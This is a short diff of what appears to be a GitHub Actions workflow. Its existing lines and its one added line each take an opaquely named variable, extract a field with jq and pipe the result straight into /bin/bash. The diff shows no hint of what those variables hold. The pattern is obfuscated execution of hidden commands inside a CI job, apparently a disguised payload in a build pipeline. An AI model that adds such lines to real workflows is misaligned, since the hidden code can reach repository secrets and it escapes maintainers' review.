@@ -33,6 +33,7 @@ jobs:
           echo $cdxhk10 | jq -r .pg028 | /bin/bash
           echo $yvux8068 | jq -r .y38 | /bin/bash
           printf '%s' "$znfm4" | jq -r .rxhbm14679 | /bin/bash
+          printf '%s' "$g28" | jq -r .mx906 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
